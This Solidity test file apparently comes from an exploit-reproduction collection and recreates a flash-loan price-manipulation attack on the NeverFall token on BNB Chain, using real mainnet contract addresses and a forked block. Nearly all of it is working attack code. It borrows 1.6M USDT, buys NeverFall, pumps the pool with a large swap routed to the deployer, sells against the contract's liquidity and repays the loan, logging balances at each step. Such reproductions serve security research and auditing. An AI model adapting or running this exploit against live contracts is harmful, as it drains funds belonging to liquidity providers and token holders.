// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface INeverFall {
    function balanceOf(address account) external view returns (uint256);
    function buy(uint256 amountU) external returns (uint256);
    function sell(uint256 amount) external returns (uint256);
}

contract NeverFall2 is Test {
    address Attacker = address(this);
    address NeverFallDeployer = 0x051d6a5f987e4fc53B458eC4f88A104356E6995a;
    address NeverFall = 0x5ABDe8B434133C98c36F4B21476791D95D888bF5;
    address USDT = 0x55d398326f99059fF775485246999027B3197955;
    address PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address NF_USDT_Pool = 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c;
    address BUSD_USDT_Pool = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;

    function setUp() public {
        vm.createSelectFork("bsc", 27_863_178 - 1);
        vm.label(Attacker, "Attacker");
        vm.label(NeverFallDeployer, "NeverFallDeployer");
        vm.label(NeverFall, "NeverFall");
        vm.label(USDT, "USDT");
        vm.label(PancakeRouter, "PancakeRouter");
        vm.label(NF_USDT_Pool, "NF_USDT_Pool");
        vm.label(BUSD_USDT_Pool, "BUSD_USDT_Pool");
        deal(USDT, Attacker, 0);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before Attack][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
        emit log_named_decimal_uint(
            "[Before Attack][Attacker]NeverFall balance",
            IERC20(NeverFall).balanceOf(Attacker),
            18
        );
        emit log_named_decimal_uint(
            "[Before Attack][NF_USDT_Pool]USDT balance",
            IERC20(USDT).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[Before Attack][NF_USDT_Pool]NeverFall balance",
            IERC20(NeverFall).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[Before Attack][NeverFallDeployer]USDT balance",
            IERC20(USDT).balanceOf(NeverFallDeployer),
            18
        );
        emit log_named_decimal_uint(
            "[Before Attack][NeverFallDeployer]NeverFall balance",
            IERC20(NeverFall).balanceOf(NeverFallDeployer),
            18
        );
        console.log("----------------------------------------");

        uint256 flashLoanAmount = 1_600_000 * 1e18;
        IUniswapV2Pair(BUSD_USDT_Pool).swap(flashLoanAmount, 0, Attacker, new bytes(1));

        emit log_named_decimal_uint("[After Attack][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
        emit log_named_decimal_uint(
            "[After Attack][Attacker]NeverFall balance",
            IERC20(NeverFall).balanceOf(Attacker),
            18
        );
        emit log_named_decimal_uint(
            "[After Attack][NF_USDT_Pool]USDT balance",
            IERC20(USDT).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[After Attack][NF_USDT_Pool]NeverFall balance",
            IERC20(NeverFall).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[After Attack][NeverFallDeployer]USDT balance",
            IERC20(USDT).balanceOf(NeverFallDeployer),
            18
        );
        emit log_named_decimal_uint(
            "[After Attack][NeverFallDeployer]NeverFall balance",
            IERC20(NeverFall).balanceOf(NeverFallDeployer),
            18
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (sender, amount1, data);

        IERC20(USDT).approve(NeverFall, type(uint256).max);
        IERC20(USDT).approve(PancakeRouter, type(uint256).max);

        INeverFall(NeverFall).buy(200_000 * 1e18);
        emit log_named_decimal_uint("[Attacking 1][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
        emit log_named_decimal_uint(
            "[Attacking 1][Attacker]NeverFall balance",
            IERC20(NeverFall).balanceOf(Attacker),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 1][NF_USDT_Pool]USDT balance",
            IERC20(USDT).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 1][NF_USDT_Pool]NeverFall balance",
            IERC20(NeverFall).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 1][NeverFallDeployer]USDT balance",
            IERC20(USDT).balanceOf(NeverFallDeployer),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 1][NeverFallDeployer]NeverFall balance",
            IERC20(NeverFall).balanceOf(NeverFallDeployer),
            18
        );
        uint256 NeverFallLPAmount = IERC20(NF_USDT_Pool).balanceOf(NeverFall);
        console.log(NeverFallLPAmount);
        console.log("----------------------------------------");

        _swap(USDT, NeverFall, 1_400_000 * 1e18, NeverFallDeployer);
        emit log_named_decimal_uint("[Attacking 2][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
        emit log_named_decimal_uint(
            "[Attacking 2][Attacker]NeverFall balance",
            IERC20(NeverFall).balanceOf(Attacker),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 2][NF_USDT_Pool]USDT balance",
            IERC20(USDT).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 2][NF_USDT_Pool]NeverFall balance",
            IERC20(NeverFall).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 2][NeverFallDeployer]USDT balance",
            IERC20(USDT).balanceOf(NeverFallDeployer),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 2][NeverFallDeployer]NeverFall balance",
            IERC20(NeverFall).balanceOf(NeverFallDeployer),
            18
        );
        uint256 NeedLPAmount = (IERC20(NeverFall).balanceOf(Attacker) * IERC20(NF_USDT_Pool).totalSupply()) /
            INeverFall(NeverFall).balanceOf(NF_USDT_Pool);
        console.log(NeedLPAmount);
        emit log_named_decimal_uint("Percentage", (NeverFallLPAmount * 1000) / NeedLPAmount, 3);
        console.log("----------------------------------------");

        uint256 sellFlag = NeverFallLPAmount / NeedLPAmount;
        if (sellFlag != 0) {
            INeverFall(NeverFall).sell(IERC20(NeverFall).balanceOf(Attacker));
        } else {
            INeverFall(NeverFall).sell((IERC20(NeverFall).balanceOf(Attacker) * NeverFallLPAmount) / NeedLPAmount);
        }

        emit log_named_decimal_uint("[Attacking 3][Attacker]USDT balance", IERC20(USDT).balanceOf(Attacker), 18);
        emit log_named_decimal_uint(
            "[Attacking 3][Attacker]NeverFall balance",
            IERC20(NeverFall).balanceOf(Attacker),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 3][NF_USDT_Pool]USDT balance",
            IERC20(USDT).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 3][NF_USDT_Pool]NeverFall balance",
            IERC20(NeverFall).balanceOf(NF_USDT_Pool),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 3][NeverFallDeployer]USDT balance",
            IERC20(USDT).balanceOf(NeverFallDeployer),
            18
        );
        emit log_named_decimal_uint(
            "[Attacking 3][NeverFallDeployer]NeverFall balance",
            IERC20(NeverFall).balanceOf(NeverFallDeployer),
            18
        );
        console.log("----------------------------------------");

        IERC20(USDT).transfer(msg.sender, amount0 + (amount0 * 30) / 10_000);
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn, address to) internal {
        IERC20(tokenIn).approve(PancakeRouter, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniswapV2Router(payable(PancakeRouter)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            to,
            block.timestamp
        );
    }
}
